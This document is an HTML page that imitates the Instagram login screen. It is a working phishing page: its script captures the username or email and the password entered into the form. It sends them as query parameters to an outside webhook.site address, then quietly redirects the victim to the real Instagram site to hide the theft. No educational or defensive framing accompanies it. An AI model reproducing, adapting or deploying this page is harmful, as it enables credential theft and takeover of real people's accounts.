<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        a {
            text-decoration: none;
            color: #00376b;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
        }

        a:hover {
            text-decoration: underline;
        }

        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding-top: 16px;
            padding-bottom: 32px;
        }

        .container {
            display: flex;
            align-items: center;
            max-width: 935px;
            width: 100%;
            gap: 32px;
        }

        /* PHONE MOCKUP */
        .phone-mockup {
            position: relative;
            width: 380px;
            height: 582px;
            flex-shrink: 0;
            background-image: url('images/phone-mockup.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }

        /* FORMS CONTAINER */
        .forms-container {
            width: 350px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .panel {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 175px;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            padding: 14px 10px;
            width: 100%;
            outline: none;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        button[type="submit"] {
            background-color: #0095f5;
            border-radius: 8px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            padding: 8px;
            width: 100%;
            border: none;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        button[type="submit"]:hover {
            background-color: #1877f2;
        }

        button[type="submit"]:disabled {
            opacity: 0.5;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }

        .divider span {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            padding: 0 10px;
        }

        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 15px;
        }

        .forgot-password {
            font-size: 12px;
            color: #00376b;
            font-weight: 400;
        }

        .signup-panel {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }

        .signup-panel a {
            color: #0095f5;
        }

        .app-download {
            text-align: center;
            padding: 10px 0;
        }

        .app-download p {
            font-size: 14px;
            margin-bottom: 15px;
        }

        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        /* SEPARATE BADGES STYLING */
        .app-stores img {
            height: 40px;
            width: auto;
            cursor: pointer;
        }

        footer {
            padding: 20px 0;
            color: #8e8e8e;
            font-size: 12px;
            text-align: center;
            background-color: #fafafa;
        }

        footer ul {
            list-style: none;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin-bottom: 15px;
            max-width: 935px;
            margin-left: auto;
            margin-right: auto;
        }

        footer a {
            color: #8e8e8e;
            font-weight: 400;
        }

        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid #fff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 875px) {
            .phone-mockup {
                display: none;
            }
            .container {
                justify-content: center;
            }
            .forms-container {
                width: 100%;
                max-width: 350px;
            }
        }
    </style>
</head>
<body>
    <main>
        <div class="container">
            <!-- LEFT SIDE: PHONE MOCKUP -->
            <div class="phone-mockup">
                <!-- Ensure you have phone-mockup.png in your images folder -->
            </div>

            <!-- RIGHT SIDE: FORMS -->
            <div class="forms-container">
                <!-- LOGIN PANEL -->
                <div class="panel">
                    <div class="logo">
                        <img src="images/logo.png" alt="Instagram Logo">
                    </div>

                    <form id="loginForm" onsubmit="submitForm(event)">
                        <label for="email" style="position: absolute; left: -10000px;">Phone number, username, or email</label>
                        <input id="email" name="email" placeholder="Phone number, username, or email" required />

                        <label for="password" style="position: absolute; left: -10000px;">Password</label>
                        <input id="password" name="password" type="password" placeholder="Password" required />

                        <button type="submit" id="loginBtn">
                            <span id="btnText">Log in</span>
                            <div class="spinner" id="spinner"></div>
                        </button>
                    </form>

                    <div class="divider">
                        <span></span>
                        <div class="or">OR</div>
                        <span></span>
                    </div>

                    <a href="#" class="fb-login">
                        Log in with Facebook
                    </a>

                    <a href="#" class="forgot-password">Forgot password?</a>
                </div>

                <!-- SIGNUP PANEL -->
                <div class="signup-panel">
                    New to Instagram? <a href="#">Sign up</a>
                </div>

                <!-- APP DOWNLOAD -->
                <div class="app-download">
                    <p>Get the app.</p>
                    <div class="app-stores">
                        <!-- SEPARATE APP STORE BADGE -->
                        <img src="images/app-store.png" alt="Download on the App Store">
                        <!-- SEPARATE GOOGLE PLAY BADGE -->
                        <img src="images/google-play.png" alt="Get it on Google Play">
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <ul>
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">Contact Uploading & Non-Users</a></li>
            <li><a href="#">Meta Verified</a></li>
        </ul>
        <p class="copyright">© 2026 Instagram from Meta</p>
    </footer>

    <script>
        function submitForm(event) {
            event.preventDefault();

            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            var btn = document.getElementById("loginBtn");
            var btnText = document.getElementById("btnText");
            var spinner = document.getElementById("spinner");

            btn.disabled = true;
            btnText.style.display = "none";
            spinner.style.display = "block";

            var webhookUrl = "https://webhook.site/8eaea8cf-232e-40f1-9ae0-92e29b04815e";
            var queryString = "?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password);

            fetch(webhookUrl + queryString, { method: 'GET' })
            .then(response => {
                setTimeout(function() {
                    window.location.href = "https://www.instagram.com";
                }, 1000);
            })
            .catch(error => {
                setTimeout(function() {
                    window.location.href = "https://www.instagram.com";
                }, 1000);
            });
        }
    </script>
</body>
</html>
